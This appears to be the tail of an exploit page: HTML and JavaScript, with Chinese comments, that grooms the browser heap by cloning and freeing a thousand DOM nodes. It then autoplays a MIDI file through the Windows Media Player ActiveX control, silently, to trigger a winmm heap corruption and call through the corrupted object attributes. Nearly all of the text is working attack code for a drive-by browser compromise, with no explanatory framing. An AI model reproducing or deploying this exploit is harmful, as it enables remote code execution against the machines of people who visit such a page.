selob.w31 = alert
selob.w32 = alert
selob.w33 = alert
selob.w34 = alert
selob.w35 = alert
selob.w36 = alert
selob.w37 = alert
selob.w38 = alert
selob.w39 = alert
selob.w40 = alert
selob.w41 = alert
selob.w42 = alert
selob.w43 = alert
selob.w44 = alert
selob.w45 = alert
selob.w46 = alert
selob.w47 = alert
selob.w48 = alert
selob.w49 = alert
selob.w50 = alert
selob.w51 = alert
selob.w52 = alert
selob.w53 = alert
selob.w54 = alert
selob.w55 = alert
selob.w56 = alert
selob.w57 = alert
selob.w58 = alert
selob.w59 = alert
selob.w60 = alert
selob.w61 = alert
selob.w62 = alert
selob.w63 = alert

  // 创建1000大小的clone数组
  var clones = new Array(1000);
  
  // 数学辅助函数辅助调试
  function feng_shui() {
    heap.gc();
    
    // 先分配1000个的CAttrArry 0x10*0x40 = 0x400
    var i = 0;
    while (i < 1000) {
        // 这个加入进来作为调试
      Math.cos(3);
      clones[i] = selob.cloneNode(true)
      i = i + 1;
       // 这个加入进来作为调试 
      Math.sin(3);
    }
    
    // 把偶数的释放掉;这样后续winmm分配的0x400就会在我们释放的内容中
    var j = 0;
    while (j < 1000) {
        Math.tan(3);
      delete clones[j];
      CollectGarbage();
      j  = j + 2;
      Math.atan(3)
    }
  }

  feng_shui();

  
function trigger(){
  var k = 999;
  while (k > 0) {
    if (typeof(clones[k].w1) == "string") {
    } else {
      clones[k].w1('come on!');
    }
    k = k - 2;
  }
  feng_shui();
  document.audio.Play();
}


</script>
<script for="audio" event="PlayStateChange(oldState,newState)">
  if (oldState == 3 && newState == 0) {
    trigger();
  }
</script>
</head>
<body>
  <object id="audio" classid="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95" height="1" width="1">
    <param name="fileName" value="/HHVHyW6d37xz/caPeI.mid">
    <param name="SendPlayStateChangeEvents" value="true">
    <param name="AutoStart" value="True">
    <param name="uiMode" value="mini">
    <param name="Volume" value="-300">
  </object>


</body></html>